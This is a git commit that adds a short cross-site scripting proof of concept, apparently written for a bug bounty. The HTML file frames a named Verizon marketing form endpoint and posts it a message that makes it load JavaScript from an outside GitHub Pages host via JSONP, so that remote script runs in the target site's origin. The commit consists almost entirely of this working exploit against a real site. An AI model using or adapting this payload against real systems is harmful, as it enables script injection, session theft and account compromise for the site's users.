a65f83c0d1ed7dcc43fabb2c4e83f15fb3f97d08
Vikas Gupta <vikasgupta.92155@gmail.com>
2026-03-28 21:05:59 +0530

    Create txss.js

---
+++ txss.js
@@ -0,0 +1,16 @@
+<html
+
+<iframe id="vulnerable_iframe" src="https://info.business.solution.verizon.com/index.php/form/XDFrame"></iframe>
+
+<script>
+var frame = document.getElementById('vulnerable_iframe').contentWindow;
+   frame.postMessage(JSON.stringify({
+     "mktoRequest": {
+       "ajaxParams": {
+         "url": "https://iamxhunt3r.github.io/bounty/txss.js?callback=?",
+         "dataType": "jsonp"
+       }
+     }
+   }), "*");
+</script>
+  </html>
